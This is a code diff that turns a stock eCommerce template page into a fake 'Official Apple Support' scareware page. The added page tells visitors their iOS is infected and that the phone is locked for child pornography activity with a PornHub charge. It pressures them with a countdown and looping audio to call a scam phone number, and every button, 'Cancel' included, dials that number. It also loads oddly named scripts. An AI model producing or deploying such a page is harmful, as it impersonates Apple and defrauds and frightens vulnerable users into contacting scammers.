@@ -1,12 +1,23 @@
-<?php
-?>
-<!DOCTYPE html>
-<html lang="zxx">
-<head>
-	<!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5041346,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5041122,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,533 +25,103 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041346&101" alt="hit counter script" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041122&101" alt="counter hit make" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-	<title>The Plaza - eCommerce Template</title>
-	<meta charset="UTF-8">
-	<meta name="description" content="The Plaza eCommerce Template">
-	<meta name="keywords" content="plaza, eCommerce, creative, html">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<!-- Favicon -->   
-	<link href="img/favicon.ico" rel="shortcut icon"/>
-
-	<!-- Google Fonts -->
-	<link href="https://fonts.googleapis.com/css?family=Raleway:400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
-
-	<!-- Stylesheets -->
-	<link rel="stylesheet" href="css/bootstrap.min.css"/>
-	<link rel="stylesheet" href="css/font-awesome.min.css"/>
-	<link rel="stylesheet" href="css/owl.carousel.css"/>
-	<link rel="stylesheet" href="css/style.css"/>
-	<link rel="stylesheet" href="css/animate.css"/>
-
-
-	<!--[if lt IE 9]>
-	  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-	  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-	<![endif]-->
-
+    
 </head>
-<body>
-	<!-- Page Preloder -->
-	<div id="preloder">
-		<div class="loader"></div>
-	</div>
-	
-	<!-- Header section -->
-	<header class="header-section">
-		<div class="container-fluid">
-			<!-- logo -->
-			<div class="site-logo">
-				<img src="img/logo.png" alt="logo">
-			</div>
-			<!-- responsive -->
-			<div class="nav-switch">
-				<i class="fa fa-bars"></i>
-			</div>
-			<div class="header-right">
-				<a href="cart.html" class="card-bag"><img src="img/icons/bag.png" alt=""><span>2</span></a>
-				<a href="#" class="search"><img src="img/icons/search.png" alt=""></a>
-			</div>
-			<!-- site menu -->
-			<ul class="main-menu">
-				<li><a href="index.html">Home</a></li>
-				<li><a href="#">Woman</a></li>
-				<li><a href="#">Man</a></li>
-				<li><a href="#">LookBook</a></li>
-				<li><a href="#">Blog</a></li>
-				<li><a href="contact.html">Contact</a></li>
-			</ul>
-		</div>
-	</header>
-	<!-- Header section end -->
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+            <video autoplay loop muted style="width: 100%;">
+  <source src="images/vdo.webm" type="video/webm">
+</video>
+        </div>
 
 
-	<!-- Hero section -->
-	<section class="hero-section set-bg" data-setbg="img/bg.jpg">
-		<div class="hero-slider owl-carousel">
-			<div class="hs-item">
-				<div class="hs-left"><img src="img/slider-img.png" alt=""></div>
-				<div class="hs-right">
-					<div class="hs-content">
-						<div class="price">from $19.90</div>
-						<h2><span>2018</span> <br>summer collection</h2>
-						<a href="" class="site-btn">Shop NOW!</a>
-					</div>	
-				</div>
-			</div>
-			<div class="hs-item">
-				<div class="hs-left"><img src="img/slider-img.png" alt=""></div>
-				<div class="hs-right">
-					<div class="hs-content">
-						<div class="price">from $19.90</div>
-						<h2><span>2018</span> <br>summer collection</h2>
-						<a href="" class="site-btn">Shop NOW!</a>
-					</div>	
-				</div>
-			</div>
-		</div>
-	</section>
-	<!-- Hero section end -->
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
 
-	
-	<!-- Intro section -->
-	<section class="intro-section spad pb-0">
-		<div class="section-title">
-			<h2>pemium products</h2>
-			<p>We recommend</p>
-		</div>
-		<div class="intro-slider">
-			<ul class="slidee">
-				<li>
-					<div class="intro-item">
-						<figure>
-							<img src="img/intro/1.jpg" alt="#">
-						</figure>
-						<div class="product-info">
-							<h5>Pink Sunglasses</h5>
-							<p>$319.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</li>
-				<li>
-					<div class="intro-item">
-						<figure>
-							<img src="img/intro/2.jpg" alt="#">
-						</figure>
-						<div class="product-info">
-							<h5>Black Nighty</h5>
-							<p>$319.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</li>
-				<li>
-					<div class="intro-item">
-						<figure>
-							<img src="img/intro/3.jpg" alt="#">
-							<div class="bache">NEW</div>
-						</figure>
-						<div class="product-info">
-							<h5>Yellow Sholder bag</h5>
-							<p>$319.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</li>
-				<li>
-					<div class="intro-item">
-						<figure>
-							<img src="img/intro/4.jpg" alt="#">
-						</figure>
-						<div class="product-info">
-							<h5>Yellow Sunglasses</h5>
-							<p>$319.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</li>
-				<li>
-					<div class="intro-item">
-						<figure>
-							<img src="img/intro/5.jpg" alt="#">
-						</figure>
-						<div class="product-info">
-							<h5>Black Sholder bag</h5>
-							<p>$319.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</li>
-			</ul>
-		</div>
-		<div class="container">
-			<div class="scrollbar">
-				<div class="handle">
-					<div class="mousearea"></div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!-- Intro section end -->
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+   <div class="alert-title">Your iOS is infected with 3 viruses. Our security check found traces of 8 malware and 12 phishing/spyware. System damage: 28.1%.<br>
+    immediete removal required!</div>
+   
+    <div class="txstm"> Please contact Apple Support immediately at <strong><a href="tel:+1-888-515-4487">+1-888-515-4487</a></strong> to secure your device and prevent unauthorized activity.</div>
+    <a href="tel:+1-888-515-4487" class="alert-button"><span id="countdown">10:00</span> remaining before damage is permanent.</a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/warn.png" alt="" width="30px"> EMERGENCY ALERTS</div>
+<div class="cursor">now</div>
+  <div class="notification-body">
+    Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase <br>of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+  </div>
+  <img src="images/apple.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    
+     <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-50px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alertimg">
+                        <img src="images/warn.png" alt="" style="width: 80px;">
+                    </div>
+                    <h4 style="font-weight: 600;">Security Warning!</h4>
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-888-515-4487" class="me-2 bg-primary">Call +1-888-515-4487</a>
+                        <a href="tel:+1-888-515-4487" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
 
 
-	<!-- Featured section -->
-	<div class="featured-section spad">
-		<div class="container">
-			<div class="row">
-				<div class="col-md-6">
-					<div class="featured-item">
-						<img src="img/featured/featured-1.jpg" alt="">
-						<a href="#" class="site-btn">see more</a>
-					</div>
-				</div>
-				<div class="col-md-6">
-					<div class="featured-item mb-0">
-						<img src="img/featured/featured-2.jpg" alt="">
-						<a href="#" class="site-btn">see more</a>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<!-- Featured section end -->
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/Jdjifsx.js"></script>
+    <script src="js/NsicjSc.js"></script>
+    <script src="js/NisifAZ.js"></script>
 
 
-	<!-- Product section -->
-	<section class="product-section spad">
-		<div class="container">
-			<ul class="product-filter controls">
-				<li class="control" data-filter=".new">New arrivals</li>
-				<li class="control" data-filter="all">Recommended</li>
-				<li class="control" data-filter=".best">Best sellers</li>
-			</ul>
-			<div class="row" id="product-filter">
-				<div class="mix col-lg-3 col-md-6 best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/1.jpg" alt="">
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Long red Shirt</h6>
-							<p>$39.90</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 new">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/2.jpg" alt="">
-							<div class="bache">NEW</div>
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Hype grey shirt</h6>
-							<p>$19.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/3.jpg" alt="">
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>long sleeve jacket</h6>
-							<p>$59.90</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 new best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/4.jpg" alt="">
-							<div class="bache sale">SALE</div>
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Denim men shirt</h6>
-							<p>$32.20 <span>RRP 64.40</span></p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/5.jpg" alt="">
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Long red Shirt</h6>
-							<p>$39.90</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 new">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/6.jpg" alt="">
-							<div class="bache">NEW</div>
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Hype grey shirt</h6>
-							<p>$19.50</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/7.jpg" alt="">
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>long sleeve jacket</h6>
-							<p>$59.90</p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-				<div class="mix col-lg-3 col-md-6 best">
-					<div class="product-item">
-						<figure>
-							<img src="img/products/8.jpg" alt="">
-							<div class="pi-meta">
-								<div class="pi-m-left">
-									<img src="img/icons/eye.png" alt="">
-									<p>quick view</p>
-								</div>
-								<div class="pi-m-right">
-									<img src="img/icons/heart.png" alt="">
-									<p>save</p>
-								</div>
-							</div>
-						</figure>
-						<div class="product-info">
-							<h6>Denim men shirt</h6>
-							<p>$32.20 <span>RRP 64.40</span></p>
-							<a href="#" class="site-btn btn-line">ADD TO CART</a>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!-- Product section end -->
 
 
-	<!-- Blog section -->	
-	<section class="blog-section spad">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-5">
-					<div class="featured-item">
-						<img src="img/featured/featured-3.jpg" alt="">
-						<a href="#" class="site-btn">see more</a>
-					</div>
-				</div>
-				<div class="col-lg-7">
-					<h4 class="bgs-title">from the blog</h4>
-					<div class="blog-item">
-						<div class="bi-thumb">
-							<img src="img/blog-thumb/1.jpg" alt="">
-						</div>
-						<div class="bi-content">
-							<h5>10 tips to dress like a queen</h5>
-							<div class="bi-meta">July 02, 2018   |   By maria deloreen</div>
-							<a href="#" class="readmore">Read More</a>
-						</div>
-					</div>
-					<div class="blog-item">
-						<div class="bi-thumb">
-							<img src="img/blog-thumb/2.jpg" alt="">
-						</div>
-						<div class="bi-content">
-							<h5>Fashion Outlet products</h5>
-							<div class="bi-meta">July 02, 2018   |   By Jessica Smith</div>
-							<a href="#" class="readmore">Read More</a>
-						</div>
-					</div>
-					<div class="blog-item">
-						<div class="bi-thumb">
-							<img src="img/blog-thumb/3.jpg" alt="">
-						</div>
-						<div class="bi-content">
-							<h5>the little black dress just for you</h5>
-							<div class="bi-meta">July 02, 2018   |   By maria deloreen</div>
-							<a href="#" class="readmore">Read More</a>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!-- Blog section end -->	
-
-
-	<!-- Footer top section -->	
-	<section class="footer-top-section home-footer">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-3 col-md-8 col-sm-12">
-					<div class="footer-widget about-widget">
-						<img src="img/logo.png" class="footer-logo" alt="">
-						<p>Donec vitae purus nunc. Morbi faucibus erat sit amet congue mattis. Nullam fringilla faucibus urna, id dapibus erat iaculis ut. Integer ac sem.</p>
-						<div class="cards">
-							<img src="img/cards/5.png" alt="">
-							<img src="img/cards/4.png" alt="">
-							<img src="img/cards/3.png" alt="">
-							<img src="img/cards/2.png" alt="">
-							<img src="img/cards/1.png" alt="">
-						</div>
-					</div>
-				</div>
-				<div class="col-lg-2 col-md-4 col-sm-6">
-					<div class="footer-widget">
-						<h6 class="fw-title">usefull Links</h6>
-						<ul>
-							<li><a href="#">Partners</a></li>
-							<li><a href="#">Bloggers</a></li>
-							<li><a href="#">Support</a></li>
-							<li><a href="#">Terms of Use</a></li>
-							<li><a href="#">Press</a></li>
-						</ul>
-					</div>
-				</div>
-				<div class="col-lg-2 col-md-4 col-sm-6">
-					<div class="footer-widget">
-						<h6 class="fw-title">Sitemap</h6>
-						<ul>
-							<li><a href="#">Partners</a></li>
-							<li><a href="#">Bloggers</a></li>
-							<li><a href="#">Support</a></li>
-							<li><a href="#">Terms of Use</a></li>
-							<li><a href="#">Press</a></li>
-						</ul>
-					</div>
-				</div>
-				<div class="col-lg-2 col-md-4 col-sm-6">
-					<div class="footer-widget">
-						<h6 class="fw-title">Shipping & returns</h6>
-						<ul>
-							<li><a href="#">About Us</a></li>
-							<li><a href="#">Track Orders</a></li>
-							<li><a href="#">Returns</a></li>
-							<li><a href="#">Jobs</a></li>
-							<li><a href="#">Shipping</a></li>
-							<li><a href="#">Blog</a></li>
-						</ul>
-					</div>
-				</div>
-				<div class="col-lg-2 col-md-4 col-sm-6">
-					<div class="footer-widget">
-						<h6 class="fw-title">Contact</h6>
-						<div class="text-box">
-							<p>Your Company Ltd </p>
-							<p>1481 Creekside Lane  Avila Beach, CA 93424, </p>
-							<p>+53 345 7953 32453</p>
-							<p>office@youremail.com</p>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!-- Footer top section end -->	
-
-		<!-- Footer section -->
-	<footer class="footer-section">
-		<div class="container">
-			<p class="copyright">
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-</p>
-		</div>
-	</footer>
-	<!-- Footer section end -->
-
-
-	<!--====== Javascripts & Jquery ======-->
-	<script src="js/jquery-3.2.1.min.js"></script>
-	<script src="js/bootstrap.min.js"></script>
-	<script src="js/owl.carousel.min.js"></script>
-	<script src="js/mixitup.min.js"></script>
-	<script src="js/sly.min.js"></script>
-	<script src="js/jquery.nicescroll.min.js"></script>
-	<script src="js/main.js"></script>
-    </body>
-</html>
+</body></html>
